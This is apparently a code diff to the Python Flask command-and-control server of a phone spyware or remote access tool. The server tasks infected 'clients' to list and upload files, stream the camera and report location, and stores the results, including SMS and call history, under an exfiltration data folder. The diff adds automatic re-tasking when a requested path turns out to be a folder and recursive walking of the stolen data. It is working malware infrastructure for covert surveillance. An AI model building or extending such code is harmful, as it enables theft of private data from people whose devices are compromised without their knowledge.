@@ -45,7 +45,6 @@ class Client:
         self.camera_stream_on = False
 
     def complete_task(self, data):
-
         client_id = self.id.hex().upper()
         print_debug(f"Completing task for {client_id}")
         if self.current_task.command_code == 0x0:
@@ -60,8 +59,11 @@ class Client:
             data = data[5:]
             success = self.current_task.callback(client_id, data)
 
-        if success:
+        if success == 1:
             self.current_task = None
+            return encrypt("success", self.key)
+        elif success == 2:
+            print_debug("RETASK")
             return encrypt("success", self.key)
         else:
             return encrypt("error", self.key)
@@ -103,9 +105,9 @@ clients: dict[str, Client] = {}
     put(10,CommandHandler::getLocation);
 """
 
+
 # Callback functions for client functions
 def save_to_disk(client_id, label, data):
-
     path = os.path.join(EXFIL_DATA_PATH, client_id, label)
     os.makedirs(path, exist_ok=True)
     file_name = os.path.join(path, datetime.now().strftime("%d-%m-%Y_%H-%M-%S"))
@@ -141,15 +143,28 @@ def file_listing_callback(client_id, data):
 
 
 def file_upload_callback(client_id, data, file_path):
-    file_dir, file_name = file_path.split(",")
-    path = os.path.join(EXFIL_DATA_PATH, client_id, file_dir)
-    os.makedirs(path, exist_ok=True)
-    file_name = os.path.join(path, file_name)
+    client = clients.get(client_id)
 
-    with open(file_name, "wb") as f:
-        f.write(data)
+    if data == b"im a directory":
+        # add a task to get the file listing if the requested file was a folder
+        file_path = "/".join(file_path.split(","))
+        print_debug(f"Detected folder: Getting listing for {file_path}")
+        command = Command(0x1, f"Get file listing: {file_path}", file_listing_callback)
+        task = Task(command, file_path)
+        client.current_task = task
+        client.file_listing_directory = file_path
 
-    return 1
+        return 2
+    else:
+        file_dir, file_name = file_path.split(",")
+        path = os.path.join(EXFIL_DATA_PATH, client_id, file_dir)
+        os.makedirs(path, exist_ok=True)
+        file_name = os.path.join(path, file_name)
+
+        with open(file_name, "wb") as f:
+            f.write(data)
+
+        return 1
 
 
 def display_stream_callback(client_id, data):
@@ -223,13 +238,15 @@ def generate_database_listing(client_id):
     database_listing = []
     if os.path.exists(client_data_path):
         for subdir in os.listdir(client_data_path):
+            # downloads, sms, call_history, etc
             subdir_full = os.path.join(client_data_path, subdir)
-            for log in os.listdir(subdir_full):
-                log_full_path = os.path.join(subdir_full, log)
-                log_full_path = os.path.abspath(log_full_path)
-                log_stats = os.stat(log_full_path)
-                entry = (subdir, log, log_stats.st_size, log_full_path)
-                database_listing.append(entry)
+            for root, dirs, files in os.walk(subdir_full):
+                for file in files:
+                    file_name = os.path.join(root, file)
+                    file_abs_path = os.path.abspath(file_name)
+                    file_size = os.stat(file_abs_path).st_size
+                    entry = (file_name, file_size, file_abs_path)
+                    database_listing.append(entry)
 
         return database_listing
 
@@ -237,7 +254,6 @@ def generate_database_listing(client_id):
 # tentatively receive data from exfil
 @app.route("/api/update", methods=["POST"])
 def recv_data():
-
     request_data = request.data
     client_id = request_data[0:8].decode()
     res = request_data[8:]
@@ -290,7 +306,6 @@ def provide_command():
 
 @app.route("/", methods=["GET", "POST"])
 def control_centre():
-
     task_count = 0
 
     for client in clients.values():
@@ -309,7 +324,6 @@ def download_log():
 # used to control individual clients
 @app.route("/client", methods=["GET"])
 def control_client():
-
     client_id = request.args.get("id")
     client = clients.get(client_id)
     command_code = request.args.get("cmd")
